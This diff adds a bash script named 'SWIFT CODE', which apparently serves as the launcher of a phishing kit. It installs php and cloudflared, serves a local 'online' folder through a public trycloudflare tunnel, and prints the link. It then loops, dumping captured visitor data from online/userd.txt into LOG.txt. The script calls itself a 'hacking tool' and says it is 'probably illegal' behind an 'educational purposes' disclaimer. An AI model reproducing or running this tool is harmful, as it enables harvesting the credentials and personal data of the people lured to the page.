@@ -1,0 +1,115 @@
+#!/usr/bin/bash 
+trap user_intrupt SIGINT
+trap user_intrupt SIGTSTP
+user_intrupt(){
+	sleep 1
+	exit 1
+}
+banner(){
+    clear
+    echo -ne WELCOME TO SWIFT CODE, A VERY LIGHT WEIGHT HACKING TOOL                                                                    
+    echo -e "\033[0;1m BUILT FOR EDUCATIONAL PURPOSES ONLY "
+}
+req(){
+    printf "${r}_______ ${p} checking for requirements ${r}_______\n"
+	if [[ -d "/data/data/com.termux/files/home" ]];then
+	if [[ `command -v proot` ]];then 
+	echo ""
+	else
+	echo -e "${g}+${y}Installing proot${g}+" 
+	 pkg install proot resolv-conf -y
+	 fi
+	 fi
+	command -v php 2>&1 > /dev/null || { echo -e "${g}+${y}Installing php${g}+" ; apt-get install php -y; }
+	command -v curl 2>&1 > /dev/null || { echo -e  "${g}+${y}Installing curl${g}+" ; apt-get install curl -y ; }
+    command -v unzip 2>&1 > /dev/null || { echo -e "${g}+${y}Installing unzip${g}+" ; apt-get install unzip -y ;}
+	command -v wget 2>&1 > /dev/null || { echo -e "${g}+${y}Installing wget${g}+" ; apt-get install wget -y ; }
+}
+req
+banner
+pidkill(){
+	id=$(pidof php)
+	kill $id > /dev/null 2>&1
+}
+hidden(){
+	if [ -d online ];then
+		rm -rf online
+		mkdir online
+		echo " "
+	else
+		mkdir online
+	fi
+}
+hidden 
+mov(){
+    cp -R offline/* online > /dev/null 
+}
+mov
+localserver(){
+	 ran=$((RANDOM % 100))
+	 php -S 127.0.0.1:88$ran -t online > /dev/null 2>&1 & sleep 4
+	 echo -e "\e[34;1m[+] Localhost started on http://127.0.0.1:88$ran"
+}
+start_cloud(){
+    rm -rf .pk.txt > /dev/null 2>&1 
+	ran=$((RANDOM % 100))
+    echo -e "\e[34;1m [+] Starting php server : "
+    php -S 127.0.0.1:88${ran} -t online > /dev/null 2>&1 & sleep 4
+    echo -e "\e[0;1m [+] Starting clodflare.. "
+    if [[ `command -v termux-chroot` ]];then
+    sleep 3 && termux-chroot ./cloudflare tunnel -url http://127.0.0.1:88${ran} --logfile .pk.txt > /dev/null 2>&1 & 
+    else
+    sleep 3 && ./cloudflare tunnel -url http://127.0.0.1:88${ran} --logfile .pk.txt > /dev/null 2>&1 & 
+    fi
+    sleep 8
+    clear
+    banner
+    echo -ne "\e[36;1m [+] WELCOME TO SWIFT, THE CLEAN AND FRESH CR00K-3D REMAKE [+]"
+    cat .pk.txt | grep "trycloudflare" | cut -d "|" -f2 | cut -d "}" -f2 
+}
+download(){
+    wget --no-check-certificate $1 -O cloudflare
+    chmod +x cloudflare 
+}
+check_platform(){
+if [[ -e cloudflare ]];then
+    echo -e "\e[36;1m [+] SKIPPING ILLIGAL SERVER ALREADY INSTALLED."
+else
+    echo -e "\e[32;1m Downloding the ILLIGAL CLOUDFLARE SERVER"
+    host=$(uname -m)
+    if [[($host == "arm") || ($host == "Android")]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
+    elif [[ $host == "aarch64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
+    elif [[ $host == "x86_64" ]];then
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
+    else 
+    download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386"
+    fi
+fi
+}
+ask_server(){
+    echo -e "\033[36;1m [+][THIS TOOL IS PROBABLY ILLIGAL]"
+	echo -e "\e[35;1m [+][ENTER YOUR 6 DIGIT CODE]"
+    read port 
+	if [[( $port == "*") || ( $port == "*")]];then
+	localserver
+	elif [[( $port == "200489") || ( $port == "Covid-19")]];then
+	check_platform
+	start_cloud
+	else 
+	echo -e "\e[31;1m[!] Invalid option: "
+	user_intrupt
+	fi
+}
+ask_server
+user_data(){
+   while true;do
+		if [[ -f online/userd.txt ]];then
+			cat online/userd.txt
+			cat online/userd.txt >> LOG.txt
+			rm -rf online/userd.txt
+		fi
+    done
+}
+user_data
